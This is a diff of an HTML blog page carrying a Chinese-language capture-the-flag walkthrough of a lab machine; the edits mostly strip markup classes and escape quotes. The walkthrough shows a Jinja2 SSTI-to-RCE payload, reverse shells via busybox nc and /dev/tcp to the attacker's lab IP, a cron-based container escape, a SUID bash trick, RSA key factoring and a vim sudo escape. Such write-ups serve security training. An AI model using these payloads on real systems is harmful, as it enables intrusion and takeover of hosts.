@@ -80,16 +80,16 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
 <h2><strong>1. 主机发现与端口扫描</strong></h2>
-<p>首先使用 <code class="notranslate">arp-scan</code> 在本地网络中确定目标主机的IP地址，随后利用 <code class="notranslate">nmap</code> 对其进行全端口扫描，以识别开放的服务。</p>
+<p>首先使用 <code>arp-scan</code> 在本地网络中确定目标主机的IP地址，随后利用 <code>nmap</code> 对其进行全端口扫描，以识别开放的服务。</p>
 <p><strong>主机发现:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ sudo arp-scan -l
 ...
 192.168.205.131 08:00:27:77:f8:3a     PCS Systemtechnik GmbH
 ...
 </code></pre>
 <p><strong>端口扫描:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ nmap -p- 192.168.205.131
 ...
 PORT   STATE SERVICE
@@ -97,63 +97,63 @@ PORT   STATE SERVICE
 80/tcp open  http
 ...
 </code></pre>
-<p>扫描结果显示，目标主机IP为 <code class="notranslate">192.168.205.131</code>，开放了 <strong>22 (SSH)</strong> 和 <strong>80 (HTTP)</strong> 端口。</p>
+<p>扫描结果显示，目标主机IP为 <code>192.168.205.131</code>，开放了 <strong>22 (SSH)</strong> 和 <strong>80 (HTTP)</strong> 端口。</p>
 <h2><strong>2. Web服务侦察</strong></h2>
-<p>访问 <code class="notranslate">http://192.168.205.131</code>，服务器返回301重定向，指向域名 <code class="notranslate">http://shieldweb.che/</code>。</p>
-<p>将域名与IP地址绑定到 <code class="notranslate">/etc/hosts</code> 文件后，进行子域名爆破，发现一个重要的子域名 <code class="notranslate">ticket.shieldweb.che</code>。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>访问 <code>http://192.168.205.131</code>，服务器返回301重定向，指向域名 <code>http://shieldweb.che/</code>。</p>
+<p>将域名与IP地址绑定到 <code>/etc/hosts</code> 文件后，进行子域名爆破，发现一个重要的子域名 <code>ticket.shieldweb.che</code>。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo vim /etc/hosts
 # 添加以下行
 192.168.205.131 shieldweb.che ticket.shieldweb.che
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ wfuzz -c -u "http://shieldweb.che" -H "HOST:FUZZ.shieldweb.che" -w /path/to/wordlist.txt --hw 11
+└─$ wfuzz -c -u &quot;http://shieldweb.che&quot; -H &quot;HOST:FUZZ.shieldweb.che&quot; -w /path/to/wordlist.txt --hw 11
 ...
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                                          
 =====================================================================
-000000453:   200        94 L     180 W      2129 Ch     "ticket - ticket"
+000000453:   200        94 L     180 W      2129 Ch     &quot;ticket - ticket&quot;
 ...
 </code></pre>
-<p>再次访问 <code class="notranslate">http://ticket.shieldweb.che</code>，发现一个联系表单页面。目录扫描显示存在 <code class="notranslate">/submit</code> 路径。</p>
+<p>再次访问 <code>http://ticket.shieldweb.che</code>，发现一个联系表单页面。目录扫描显示存在 <code>/submit</code> 路径。</p>
 <h1><strong>二、漏洞发现与初始访问</strong></h1>
 <h2><strong>1. SSTI (服务器端模板注入)</strong></h2>
-<p>在联系表单的 <code class="notranslate">name</code> 字段中输入 <code class="notranslate">{{7*7}}</code> 并提交到 <code class="notranslate">/submit</code> 端点，返回结果中显示了 <code class="notranslate">49</code>。这证实了该表单存在 <strong>Jinja2 服务器端模板注入 (SSTI)</strong> 漏洞。</p>
+<p>在联系表单的 <code>name</code> 字段中输入 <code>{{7*7}}</code> 并提交到 <code>/submit</code> 端点，返回结果中显示了 <code>49</code>。这证实了该表单存在 <strong>Jinja2 服务器端模板注入 (SSTI)</strong> 漏洞。</p>
 <p><strong>漏洞验证:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://ticket.shieldweb.che/submit -X POST -d 'name={{7*7}}&amp;email=a&amp;message=a'
 ...
-&lt;div class="response success"&gt;
+&lt;div class=&quot;response success&quot;&gt;
     Thank you for your message, 49!
 &lt;/div&gt;
 ...
 </code></pre>
 <h2><strong>2. SSTI 到 RCE</strong></h2>
-<p>利用SSTI漏洞，构造Payload以执行远程代码。通过遍历Python对象，可以调用 <code class="notranslate">os.popen</code> 来执行系统命令。</p>
-<p><strong>执行 <code class="notranslate">id</code> 命令:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate"># Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+<p>利用SSTI漏洞，构造Payload以执行远程代码。通过遍历Python对象，可以调用 <code>os.popen</code> 来执行系统命令。</p>
+<p><strong>执行 <code>id</code> 命令:</strong></p>
+<pre lang="bash"><code># Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://ticket.shieldweb.che/submit -X POST -d 'name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%20%7D%7D&amp;email=1&amp;message=1'
 ...
 
-&lt;div class="response success"&gt;
+&lt;div class=&quot;response success&quot;&gt;
     Thank you for your message, uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 !
 &lt;/div&gt;
 
 ...
 </code></pre>
-<p>命令成功以 <code class="notranslate">root</code> 用户身份在一个容器内执行。</p>
+<p>命令成功以 <code>root</code> 用户身份在一个容器内执行。</p>
 <h2><strong>3. 获取反弹Shell (Docker内)</strong></h2>
-<p>构造反弹Shell的Payload，在本地Kali开启监听，成功获取一个Docker容器内的 <code class="notranslate">root</code> 权限Shell。</p>
+<p>构造反弹Shell的Payload，在本地Kali开启监听，成功获取一个Docker容器内的 <code>root</code> 权限Shell。</p>
 <p><strong>本地监听:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">nc -lvnp 8888
+<pre lang="bash"><code>nc -lvnp 8888
 </code></pre>
 <p><strong>执行反弹Shell Payload:</strong>（去web执行，不然会有<strong>shell 解析问题</strong>）</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.128 8888 -e $(which $(echo $0)) ').read() }}
+<pre lang="bash"><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('busybox nc 192.168.205.128 8888 -e $(which $(echo $0)) ').read() }}
 </code></pre>
 <p><strong>稳定shell：</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">python -c 'import pty; pty.spawn("ash")'
+<pre lang="bash"><code>python -c 'import pty; pty.spawn(&quot;ash&quot;)'
 Ctrl+Z
 stty raw -echo; fg
 reset xterm
@@ -163,59 +163,59 @@ stty rows 24 columns 80
 </code></pre>
 <h1><strong>三、权限提升</strong></h1>
 <h2><strong>1. 容器逃逸 (Docker -&gt; love)</strong></h2>
-<p>在获得的Docker Shell中进行信息收集，发现 <code class="notranslate">/var/log/access.yml</code> 文件中记录了一条可疑的 <code class="notranslate">cron</code> 计划任务。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">/var/log # cat access.yml
+<p>在获得的Docker Shell中进行信息收集，发现 <code>/var/log/access.yml</code> 文件中记录了一条可疑的 <code>cron</code> 计划任务。</p>
+<pre lang="bash"><code>/var/log # cat access.yml
 ...
 2023-08-31 22:45:00 - Usuario: A.love - Accion: Tarea cron ejecutada: */5 * * * * root bash /home/love/script/*
 ...
 </code></pre>
-<p>该任务每5分钟以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/home/love/script/</code> 目录下的所有脚本。通过 <code class="notranslate">linpeas.sh</code> 等工具或手动 <code class="notranslate">mount</code> 检查，发现宿主机的 <code class="notranslate">/home/love/script</code> 被挂载到了容器的 <code class="notranslate">/script</code> 目录，并且该目录可写。这是一个典型的容器逃逸路径。</p>
+<p>该任务每5分钟以 <code>root</code> 权限执行 <code>/home/love/script/</code> 目录下的所有脚本。通过 <code>linpeas.sh</code> 等工具或手动 <code>mount</code> 检查，发现宿主机的 <code>/home/love/script</code> 被挂载到了容器的 <code>/script</code> 目录，并且该目录可写。这是一个典型的容器逃逸路径。</p>
 <ol>
 <li>
-<p>在容器的 <code class="notranslate">/script</code> 目录下创建一个反弹Shell脚本。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">/script # echo 'bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1"' &gt; 
+<p>在容器的 <code>/script</code> 目录下创建一个反弹Shell脚本。</p>
+<pre lang="bash"><code>/script # echo 'bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1&quot;' &gt; 
 a.sh
 /script # chmod +x a.sh 
 </code></pre>
 </li>
 <li>
-<p>在本地Kali开启 <code class="notranslate">8888</code> 端口监听。等待cron任务执行后，成功接收到宿主机 <code class="notranslate">love</code> 用户的Shell。</p>
+<p>在本地Kali开启 <code>8888</code> 端口监听。等待cron任务执行后，成功接收到宿主机 <code>love</code> 用户的Shell。</p>
 </li>
 </ol>
 <h2><strong>2. love -&gt; mitnick</strong></h2>
-<p>在 <code class="notranslate">love</code> 用户的Shell中，执行 <code class="notranslate">sudo -l</code> 发现其可以免密以 <code class="notranslate">mitnick</code> 用户身份运行一个名为 <code class="notranslate">sas</code> 的程序。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">love@osiris:~$ sudo -l
+<p>在 <code>love</code> 用户的Shell中，执行 <code>sudo -l</code> 发现其可以免密以 <code>mitnick</code> 用户身份运行一个名为 <code>sas</code> 的程序。</p>
+<pre lang="bash"><code>love@osiris:~$ sudo -l
 ...
 User love may run the following commands on osiris:
     (mitnick) NOPASSWD: /home/mitnick/sas
 </code></pre>
-<p>运行 <code class="notranslate">/home/mitnick/sas</code> 后进入一个受限的自定义shell。该shell内置了 <code class="notranslate">run</code> 命令，可以执行外部脚本。</p>
+<p>运行 <code>/home/mitnick/sas</code> 后进入一个受限的自定义shell。该shell内置了 <code>run</code> 命令，可以执行外部脚本。</p>
 <ol>
 <li>
-<p>在 <code class="notranslate">/tmp</code> 目录创建一个脚本，用于复制 <code class="notranslate">/bin/bash</code> 并为其赋予SUID权限。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">love@osiris:/tmp$ echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' &gt; a.sh
+<p>在 <code>/tmp</code> 目录创建一个脚本，用于复制 <code>/bin/bash</code> 并为其赋予SUID权限。</p>
+<pre lang="bash"><code>love@osiris:/tmp$ echo 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh' &gt; a.sh
 love@osiris:/tmp$ chmod +x a.sh
 </code></pre>
 </li>
 <li>
-<p>通过 <code class="notranslate">sas</code> shell执行该脚本。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">love@osiris:~$ sudo -u mitnick /home/mitnick/sas
+<p>通过 <code>sas</code> shell执行该脚本。</p>
+<pre lang="bash"><code>love@osiris:~$ sudo -u mitnick /home/mitnick/sas
 # run /tmp/a.sh
 </code></pre>
 </li>
 <li>
-<p>执行 <code class="notranslate">/tmp/sh -p</code>，成功获得 <code class="notranslate">mitnick</code> 用户的有效权限。</p>
+<p>执行 <code>/tmp/sh -p</code>，成功获得 <code>mitnick</code> 用户的有效权限。</p>
 </li>
 </ol>
 <h2><strong>3. mitnick -&gt; tomu</strong></h2>
-<p>在 <code class="notranslate">mitnick</code> 用户的家目录下，发现一个公钥文件 <code class="notranslate">publickey.pub</code> 和一个加密文件 <code class="notranslate">secret.enc</code>。通过查看<code class="notranslate">publickey.pub</code>可以发现这是一个非常短的 RSA 公钥，长度只有 <strong>512 位</strong>，这意味着<strong>可以用 RSA 因数分解攻击直接爆破私钥</strong>。</p>
+<p>在 <code>mitnick</code> 用户的家目录下，发现一个公钥文件 <code>publickey.pub</code> 和一个加密文件 <code>secret.enc</code>。通过查看<code>publickey.pub</code>可以发现这是一个非常短的 RSA 公钥，长度只有 <strong>512 位</strong>，这意味着<strong>可以用 RSA 因数分解攻击直接爆破私钥</strong>。</p>
 <ol>
 <li>
 <p>将这两个文件传输到本地Kali攻击机。</p>
 </li>
 <li>
-<p>使用 <code class="notranslate">RsaCtfTool</code> 工具，利用公钥来解密文件。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~]
+<p>使用 <code>RsaCtfTool</code> 工具，利用公钥来解密文件。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ RsaCtfTool --publickey publickey.pub --decryptfile secret.enc --private
 ...
 utf-8 : sh1m0mur4Bl4ckh4t
@@ -223,46 +223,47 @@ utf-8 : sh1m0mur4Bl4ckh4t
 </code></pre>
 </li>
 <li>
-<p>成功解密出密码：<code class="notranslate">sh1m0mur4Bl4ckh4t</code>。</p>
+<p>成功解密出密码：<code>sh1m0mur4Bl4ckh4t</code>。</p>
 </li>
 <li>
-<p>在 <code class="notranslate">/home</code> 目录下发现另一用户 <code class="notranslate">tomu</code>。使用刚解出的密码成功切换到 <code class="notranslate">tomu</code> 用户。</p>
+<p>在 <code>/home</code> 目录下发现另一用户 <code>tomu</code>。使用刚解出的密码成功切换到 <code>tomu</code> 用户。</p>
 </li>
 </ol>
 <h2><strong>4. tomu -&gt; root</strong></h2>
-<p>在 <code class="notranslate">tomu</code> 用户的Shell中，再次执行 <code class="notranslate">sudo -l</code>，发现可以免密以 <code class="notranslate">root</code> 身份运行 <code class="notranslate">/opt/Contempt/Contempt</code>。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">tomu@osiris:~$ sudo -l
+<p>在 <code>tomu</code> 用户的Shell中，再次执行 <code>sudo -l</code>，发现可以免密以 <code>root</code> 身份运行 <code>/opt/Contempt/Contempt</code>。</p>
+<pre lang="bash"><code>tomu@osiris:~$ sudo -l
 ...
 User tomu may run the following commands on osiris:
     (root) /opt/Contempt/Contempt
 </code></pre>
-<p>执行该程序后，出现一个菜单。选择 <code class="notranslate">2</code> (Ayuda) 会使用 <code class="notranslate">vim</code> 打开帮助文档。<code class="notranslate">vim</code> 在以<code class="notranslate">sudo</code>权限运行时，可以通过内部命令逃逸到shell。</p>
+<p>执行该程序后，出现一个菜单。选择 <code>2</code> (Ayuda) 会使用 <code>vim</code> 打开帮助文档。<code>vim</code> 在以<code>sudo</code>权限运行时，可以通过内部命令逃逸到shell。</p>
 <ol>
 <li>
 <p>执行提权命令。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">tomu@osiris:~$ sudo /opt/Contempt/Contempt
+<pre lang="bash"><code>tomu@osiris:~$ sudo /opt/Contempt/Contempt
 </code></pre>
 </li>
 <li>
-<p>在程序菜单中选择 <code class="notranslate">2</code>，进入 <code class="notranslate">vim</code> 界面。</p>
+<p>在程序菜单中选择 <code>2</code>，进入 <code>vim</code> 界面。</p>
 </li>
 <li>
-<p>在 <code class="notranslate">vim</code> 命令模式下，输入 <code class="notranslate">!bash</code> 或 <code class="notranslate">!sh</code> 并回车。</p>
-<pre lang="vim" class="notranslate"><code class="notranslate">:!bash
+<p>在 <code>vim</code> 命令模式下，输入 <code>!bash</code> 或 <code>!sh</code> 并回车。</p>
+<pre lang="vim"><code>:!bash
 </code></pre>
 </li>
 <li>
-<p>成功获取 <code class="notranslate">root</code> 权限的交互式Shell。</p>
+<p>成功获取 <code>root</code> 权限的交互式Shell。</p>
 </li>
 </ol>
-<p><strong>最终在 <code class="notranslate">/root</code> 和 <code class="notranslate">/home/tomu</code> 目录下找到flag。</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">root@osiris:~# cat /root/root.sh
+<p><strong>最终在 <code>/root</code> 和 <code>/home/tomu</code> 目录下找到flag。</strong></p>
+<pre lang="bash"><code>root@osiris:~# cat /root/root.sh
 ...
 flag --&gt; 1e271c5ce97e76ae8417a95c74085fba
 ...
 root@osiris:~# cat /home/tomu/user.txt
 612701a03669485d94bc687449fdab39
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
